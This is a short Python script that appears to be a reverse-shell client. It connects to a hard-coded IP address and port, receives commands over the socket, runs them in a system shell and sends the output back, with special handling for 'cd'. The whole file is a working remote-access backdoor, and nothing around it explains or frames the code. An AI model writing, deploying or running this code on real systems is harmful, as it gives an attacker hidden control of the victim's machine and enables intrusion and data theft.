import socket
import subprocess;
import os;
ip=str();
port=int();
#ip=input("ip: ");
#port=int(input("port: "))
ip="192.168.43.47"
port=6666;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,0);
s.connect((ip,port));
while(True):
	data=s.recv(1024).decode("utf-8");
	if(data[:1+1]=="cd"):
		os.chdir(data[3:]);
		s.send(str.encode(os.getcwd));
	else:
		output=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
		byte_data=str(output.stdout.read()+output.stderr.read(),"utf-8")
		en_data=str.encode(byte_data);
		s.send(en_data)